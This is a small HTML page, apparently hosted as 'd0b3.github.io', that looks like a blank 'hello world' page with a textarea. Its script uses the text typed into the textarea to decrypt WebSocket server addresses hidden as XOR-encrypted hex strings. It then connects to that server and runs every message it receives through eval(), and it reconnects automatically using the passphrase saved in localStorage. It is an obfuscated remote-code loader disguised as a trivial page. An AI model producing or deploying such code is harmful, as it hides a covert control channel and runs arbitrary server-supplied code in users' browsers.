<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui">
    <title>d0b3.github.io</title>
    <style>
      html, body { margin: 0; height: 100%; }
      body {
        display: flex;
        flex-flow: column;
        align-items: center;
        justify-content: center;
        background: #fefbf7;
        color: #a0bcc2;
      }
      textarea {
        width: 480px;
        height: 320px;
      }
    </style>
    <script type="module">

      await new Promise(r => addEventListener('DOMContentLoaded', r, { once: true }));

      async function sha (t) { return new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(t))); };
      async function dec (sock, salt, pass) {
    sock = new Uint8Array(sock.match(/.{2}/g).map(s=>parseInt(s, 16)));
    const flp = await sha(salt+pass+salt);
    for (let i = 0; i < sock.length; i++) sock[i] ^= flp[i%flp.length];
    try {
      const host = new TextDecoder().decode(sock.slice(32)).trim(),
            chk = await sha(host);
      for (let i = 0; i < chk.length; i++) if (chk[i] !== sock[i]) return;
      return 'ws'+host.slice(4)+'/'+[...flp].map(b=>b.toString(16).padStart(2,'0')).join('');
    } catch { }
  };

      const SOCK = ["7ec41ea85b73b5cd57115618e00af321c04f5e080160c799cc9f60e08be0d980bd69dd4579b5bc5cc9c4a80348da0c69e872fe723eb5bd0878d1d979bc932855f8649e002be1fd1587c0a5594cdb4f25ab6efe782ab0af1f309bdf60fcc36705bd69dd45","a8ae2efcaffebfc7e909d7c419ba5d414f1ed4e9c53b07cb73e931939f19c2a66b03ed118d38fe0223c42e91ee36eb532622688eedaa6a5a9cee9d13f57f71602e51b950c476fa0f79c02fd2a275f7532c366d9cfae2205c85aecd5ca53a7c236b03"];

      const $ta = document.querySelector('textarea');
      try { $ta.value = localStorage.getItem('value') || ''; } catch { };

      $ta.onchange = $ta.onkeyup = async () => {
        const value = $ta.value.trim();
        if (!value) return;
        for (const sock of SOCK) {
          const url = await dec(sock, "whatever", value);
          if (url) {
            $ta.value = 'connecting';
            localStorage.setItem('value', value);
            const socket = new WebSocket(url);
            socket.binaryType = 'arraybuffer';
            socket.onmessage = ev => { eval(new TextDecoder().decode(ev.data))(socket); };
            socket.onerror = () => { $ta.value = 'vodafone m√ºde'; };
            return;
          }
        }
      };

      $ta.onchange();

    </script>
  </head>
  <body>
    <h1>hello world</h1>
    <textarea></textarea>
  </body>
</html>